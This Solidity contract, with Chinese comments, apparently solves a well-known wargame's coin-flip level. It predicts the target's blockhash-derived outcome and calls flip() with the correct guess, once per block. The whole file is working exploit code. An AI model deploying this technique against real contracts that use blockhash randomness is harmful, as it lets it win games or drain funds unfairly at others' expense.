// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    // 必须和原合约完全相同的因子
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // 目标合约地址
    ICoinFlip private immutable target;
    // 记录上一次使用的区块哈希，防止同一区块重复调用
    uint256 private lastHash;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function hack() external returns (bool) {
        // 1. 获取上一个区块的哈希
        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        // 2. 安全检查：确保是新区块，并且哈希有效
        require(blockValue != 0, "Wait for the next block");
        require(blockValue != lastHash, "Already called for this block");
        lastHash = blockValue;

        // 3. 用与原合约完全相同的逻辑计算结果
        uint256 coinFlipResult = blockValue / FACTOR;
        bool guess = (coinFlipResult == 1); // true = 正面，false = 反面

        // 4. 调用目标合约
        bool success = target.flip(guess);
        require(success, "Call to target failed");
        
        return success;
    }

    // 辅助函数：查看当前区块的预测结果（调试用）
    function predict() external view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(blockValue != 0, "Block hash not available");
        uint256 coinFlipResult = blockValue / FACTOR;
        return (coinFlipResult == 1);
    }
}